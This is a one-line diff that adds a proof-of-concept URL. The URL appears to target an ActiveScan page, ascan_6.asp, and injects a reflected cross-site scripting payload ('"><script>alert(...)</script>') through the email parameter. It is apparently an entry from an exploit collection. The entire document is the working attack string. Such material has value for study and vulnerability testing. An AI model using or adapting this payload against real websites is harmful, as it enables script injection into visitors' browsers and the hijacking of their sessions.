@@ -1,0 +1,1 @@
+http://www.example.com/activescan/activescan/ascan_6.asp?IdLang=2&amp;Idvendor=17490&amp;Idpais=63&amp;email=Lostmon@gmail.com%22%3E%3Cscript%3Ealert%28%27XSS%20Vulnerability%27%29%3C/script%3E%26&amp;pais=62&amp;provincia=9&amp;tipousuario=0&amp;enviar=1&amp;ode=0#
